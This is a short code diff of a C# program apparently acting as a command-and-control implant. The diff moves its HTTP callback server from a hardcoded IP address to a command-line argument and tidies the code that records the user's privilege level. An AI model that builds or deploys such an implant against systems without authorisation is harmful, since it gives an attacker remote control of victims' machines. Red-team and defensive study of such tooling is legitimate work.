@@ -20,20 +20,29 @@ namespace Agent
 
         static void Main(string[] args)
         {
+            string server = "127.0.0.1";
+            int port = 8080;
+            if (args.Length == 1)
+            {
+                var split = args[0].Split(':');
+                server = split[0];
+                port = Convert.ToInt32(split[1]);
+            }
+
             GenerateMetadata();
 
-            s_commModule = new HttpCommModule("13.38.61.75", 80);
+            s_commModule = new HttpCommModule(server, port);
             //s_commModule = new HttpCommModule("192.168.56.102", 8080);
             //s_commModule = new HttpCommModule("15.188.8.236", 80);
-            
+
 
             var agent = new Models.Agent(s_metadata, s_commModule);
             agent.Start();
         }
 
-      
 
-      
+
+
 
         static void GenerateMetadata()
         {
@@ -44,9 +53,9 @@ namespace Agent
             if (userName == "SYSTEM")
                 integrity = "SYSTEM";
 
-            using(var identity = WindowsIdentity.GetCurrent())
+            using (var identity = WindowsIdentity.GetCurrent())
             {
-                if(identity.User != identity.Owner)
+                if (identity.User != identity.Owner)
                 {
                     integrity = "High";
                 }
